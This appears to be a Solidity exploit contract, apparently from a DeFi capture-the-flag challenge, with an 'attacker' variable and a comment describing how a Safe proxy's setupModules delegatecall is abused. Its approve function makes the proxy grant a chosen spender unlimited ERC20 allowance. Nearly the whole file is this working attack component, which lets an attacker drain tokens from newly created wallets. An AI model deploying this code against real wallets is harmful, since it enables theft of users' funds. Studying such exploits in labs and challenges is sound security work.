// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract FallbackHandler {
    address attacker;

    // setupModules(to,data) => proxy delegate call => aprrove (msg.sender = proxy ) => erc20.approve
    function approve(address spender, address token) external {
        IERC20(token).approve(spender, type(uint256).max);
    }
}
